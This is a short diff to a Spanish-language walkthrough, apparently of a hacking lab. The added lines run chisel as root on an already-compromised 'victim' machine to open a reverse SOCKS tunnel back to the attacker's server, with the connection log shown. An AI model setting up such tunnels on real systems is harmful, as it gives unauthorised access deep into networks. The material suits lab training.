@@ -57,4 +57,13 @@ ahora solo falta arrancar el servidor con el siguiente comando
 2026/03/27 07:56:48 server: Listening on http://0.0.0.0:8080
 
 
+desde la maquina victima a la que ya tenemos acceso volvemos a utilizar chisel
+
+root@ad0559c021f9:/# ./chisel client 172.20.0.20:8080 R:socks &
+[1] 175
+root@ad0559c021f9:/# 2026/03/27 09:03:29 client: Connecting to ws://172.20.0.20:8080
+2026/03/27 09:03:29 client: Connected (Latency 619.342µs)
+
+
+
 
